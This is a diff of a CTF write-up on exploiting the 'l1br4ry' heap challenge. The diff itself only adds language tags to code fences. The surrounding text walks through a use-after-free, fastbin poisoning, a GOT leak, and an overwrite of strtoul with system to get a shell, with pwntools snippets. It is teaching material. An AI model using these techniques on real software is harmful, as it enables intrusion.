@@ -17,7 +17,7 @@ This is a heap exploit, so I highly recommend reading [sploitfun's glibc malloc 
 
 We first run `file` and `checksec` on the binary:
 
-```
+```console
 $ file ./l1br4ry
 ./l1br4ry: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=bf33c931483fc879e24933eae963d1a0cef99174, stripped
 
@@ -34,7 +34,7 @@ We have a 64-bit dynamically linked binary with canaries enabled.
 
 The binary is a catalog for books. You can add books, edit them, and set a book as your favorite:
 
-```
+```console
 $ ./l1br4ry
 Welcome to your personal Library
 
@@ -84,7 +84,7 @@ Another thing I noticed was that there was an implementation `memmove`. Usually 
 
 The code to add a book looks like this:
 
-```
+```c
 array_size = 8 * num_books++;
 book_array = (Book **)realloc(book_array, array_size);
 book_slot = &book_array[num_books - 1];
@@ -95,7 +95,7 @@ add_book(new_book);
 
 The array size is calculated as eight times the number of books. We then `realloc` enough space for the array, grab the last slot in the array, and add a new `Book` pointer in that slot. A `Book` struct looks like this:
 
-```
+```c
 struct Book
 {
   char title[32];
@@ -106,7 +106,7 @@ struct Book
 
 The code to delete a book is also relevant:
 
-```
+```c
 custom_memmove((char *)&book_array[index - 1], (char *)&book_array[index], 8 * (num_books - index));
 book_array = (Book **)realloc(book_array, 8 * --num_books);
 free(book);
@@ -114,7 +114,7 @@ free(book);
 
 We first remove the `Book` pointer from the array, then we realloc a smaller chunk of memory, and finally we free the book. Notice how the code doesn't do any checks to see if this is your favorite book. So what happens if we delete our favorite book?
 
-```
+```console
 $ ./l1br4ry
 Welcome to your personal Library
 
@@ -252,7 +252,7 @@ delete_book(1)
 The very first book we created in that loop will be allocated in the memory where the favorite chunk previously resided. We delete that book so that we still have control over the fastbin list, just like we did for the leak.
 
 Before we add a fake chunk to the list, let's make a valid one. We'll put it inside of the second book.
-```
+```python
 # Create fake chunk by setting correct metadata size
 edit_title(2, p64(0x51), 'AAAAAAAA', 10)
 ```
@@ -260,7 +260,7 @@ edit_title(2, p64(0x51), 'AAAAAAAA', 10)
 The important part here is that we put a 0x51 in memory. As long as that lines up with the size of the heap chunk, glibc won't complain about it being the wrong size.
 
 Now we make our fastbin list point this this fake chunk:
-```
+```python
 # Add a fake chunk to the fastbin list
 edit_title(0, p64(heap_leak + 0x58), 'BBBBBBBB', 10)
 ```
@@ -268,7 +268,7 @@ edit_title(0, p64(heap_leak + 0x58), 'BBBBBBBB', 10)
 It turned out that we wrote that 0x51 to `heap_leak + 0x60`. That means we need to say our fake chunk is at `heap_leak + 0x58` in order for the size to be at the right spot.
 
 When we allocate two more books, the size of `book_array` will increase to 64. Furthermore, the `book_array` that was just `realloc`'d will be in the fake chunk we created! It may be tricky to convince yourself why this happens, but I enourage you to step through this with `gdb` and `pwndbg` and use the `bins` command to see how the fastbins list changes.
-```
+```python
 add_book('junk', 'junk', 10)
 add_book('junk2', 'junk2', 10)
 ```
@@ -279,7 +279,7 @@ It's worth mentioning that I initially tried to do something like this just with
 
 Now that we control the `book_array` through book two, let's try to print out a GOT address. We can try something like this:
 
-```
+```python
 strtoul_got_addr = 0x602070
 edit_title(2, p64(strtoul_got_addr), '', 10)
 ```
@@ -305,18 +305,18 @@ You can also see that we didn't leak any address, and books 1, 2, and 3 are `NUL
 
 Now the above code won't cause the program to crash, but we still don't get our leak. That's because the 8 bytes we're overwrite are the size bytes of our fake chunk, not the data part of the chunk. We can fix that with something like this:
 
-```
+```python
 edit_title(2, 'AAAAAAAA' + p64(strtoul_got_addr), '', 0)
 ```
 
 But this leaves us with an invalid size. That's actually fine for the rest of our exploit, but if we did want to allocate another book for some reason, `realloc` would attempt to reallocate on the same chunk of memory and fail because of the invalid size. To be safe, we'll do this:
 
-```
+```python
 edit_title(2, p64(0x51), p64(strtoul_got_addr), 0)
 ```
 
 Note that this wouldn't have worked:
-```
+```python
 edit_title(2, p64(0x51) + p64(strtoul_got_addr), '', 0)
 ```
 
@@ -324,7 +324,7 @@ Because the code uses `strncpy`, and `NULL` bytes wouldn't be accepted in the ti
 
 Finally, we can leak our libc address:
 
-```
+```python
 p.recvuntil('Editing title: Q')
 p.recvuntil('4: ')
 libc_leak = u64(p.recvline().strip().ljust(8, '\x00'))
@@ -334,7 +334,7 @@ log.info('libc_leak: %s' % hex(libc_leak))
 ## Getting a shell
 
 Now that we've leaked a libc address, we can find the address of `system`:
-```
+```python
 strtoul_offset = 0x3d410
 system_offset = 0x46590
 
@@ -347,7 +347,7 @@ log.info('system_addr: %s' % hex(system_addr))
 
 Finally, we edit the address of `strtoul` to `system`:
 
-```
+```python
 edit_title(4, p64(system_addr), '', '/bin/sh')
 p.interactive()
 ```
@@ -361,14 +361,14 @@ For the actual challenge, you needed to use a libc from Debian Jessie, which I f
 # Tips
 
 One tip I wanted to point out is this pwntools code I didn't really talk about:
-```
+```python
 gdb.attach(p, '''
 ''')
 ```
 
 The code above will attach GDB to the process `p`. However you can put GDB commands in between the quotes:
 
-``` abap
+```python
 gdb.attach(p, '''
 # free book pointer
 b *0x400EE2
@@ -379,7 +379,7 @@ Note that I've even commented what the breakpoint is for. I usually have up to 1
 
 On the same note, you can even define variables in that array:
 
-```
+```python
 gdb.attach(p, '''
 set $num_books = 0x6020C0
 set $book_array = 0x6020B8
